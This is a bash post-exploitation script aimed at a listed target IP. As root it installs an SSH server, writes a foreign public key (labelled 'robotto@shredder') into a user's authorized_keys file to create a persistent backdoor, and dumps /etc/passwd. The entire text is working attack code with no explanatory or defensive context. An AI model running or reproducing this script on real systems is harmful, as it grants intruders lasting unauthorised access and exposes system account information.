#!/usr/bin/env bash
#TARGET IP: 172.16.2.190

sudo su
apt-get install openssh-server -y --force-yes
mkdir -p /home/superuser/.ssh
cd /home/superuser/.ssh
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDENw5CahE6OWKb8GumjNX/N04BezWLdGld6T/jhXxB73H54YxHiuGyM+IRINK94xQQmyg9ep3GG1aNOy9CkP+B9eN6WtZgP2N1JyUBbxT0jHJt3tH/s3oyN7o3nzIPoSeCr/NRamcaaTq2mklL4beUIgyRToCvWa5b4KQG76libWpB6QgQE+2mfVekcGGZ6ZiXz4P05ach73XV0YA4xNbd0zO+ajkvQUPBQl/rjxuFtfBZxWX2uES99eQROtoqSRmoPtZWssn1V/Bzq/1Yua4s0Yp16JNdcxdpBpuuktxsZj/oMydJ2SFsdDMtryCa3oJzm/kklooiDMkOA4VGmbnfSsGANn7VpiyLJr1PGBcNqUtcwhoW3+dqP43KjKamYWXhFE1/HEYGTSDcFQnvdkqc6SppYCX67sbBtAqvDJF+olkSvq8tBFJO2PIsw9wobFrXuUMBQyW+v6wg4DyAaiKXJ9B00O1fxYx2Jd5UKbnzekLss+NOHuqb4wrcLNySi7IzU+/0YmpvjmSZcGAsNNoEJX4FfO8rUQ8QSwBaHWuuWtT2qwAVy24W53ngMx8Zb1YnwyGyZnK2SPun1d8NS7BTZgGnA9kJPNzSHVjIsRen2Nl5vsD2jOXpj5c5ffYfMtD/KNhBJsyaoBUlcZGcbzjM4VmiAUG79BV7/+YsQsjCMw== robotto@shredder > authorized_keys

echo "CAT'ing /etc/passwd:"
cat /etc/passwd

#exit from SU:
exit

#exit proper:
exit 0
